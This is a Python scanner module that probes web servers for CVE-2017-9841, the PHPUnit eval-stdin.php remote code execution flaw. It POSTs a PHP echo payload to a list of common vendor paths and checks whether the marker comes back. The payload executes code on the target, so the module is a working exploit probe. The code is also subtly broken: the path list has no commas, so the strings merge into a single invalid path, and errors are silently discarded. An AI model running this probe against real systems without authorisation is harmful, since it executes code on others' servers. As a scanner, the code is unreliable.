from .scan import Scan
import aiohttp
import traceback

class Cve_2017_9841(Scan):
    async def scan(self, session : aiohttp.ClientSession):
        vulns = []
        data = {}
        paths = [
            "laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
            "wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
            "cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
            "www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
            "lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
            "lib/phpunit/src/Util/PHP/eval-stdin.php"
            "admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
            "vendor/phpunit/phpunit/Util/PHP/eval-stdin.php"
            "wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
            "phpunit/phpunit/Util/PHP/eval-stdin.php"
            "dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
            "backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
            "lib/phpunit/phpunit/Util/PHP/eval-stdin.php"
            "old/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
            "wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
            "vendor/phpunit/Util/PHP/eval-stdin.php"
            "phpunit/src/Util/PHP/eval-stdin.php"
            "sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
            "vendor/phpunit/src/Util/PHP/eval-stdin.php"
            "wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
            "new/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
            "phpunit/Util/PHP/eval-stdin.php"
            "panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
            "protected/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
            "lib/phpunit/Util/PHP/eval-stdin.php"
            "blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
            "phpunit/phpunit/src/Util/PHP/eval-stdin.php"
            "vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
        ]

        try:
            for path in paths:
                async with session.post(
                    **{"url":str(self.ping.url)+path}, **self.request_args, timeout=2,
                    data='<?php echo "CVE"."-2017-9841";'
                ) as resp:
                    if resp.status == 200:
                        text = (await resp.text())
                        if "CVE-2017-9841" in text:
                            vulns.append("CVE-2017-9841")
                            data["CVE-2017-9841"] = {"data": {"path": path}}
                            break
        except Exception as e:
            pass

        return vulns, data
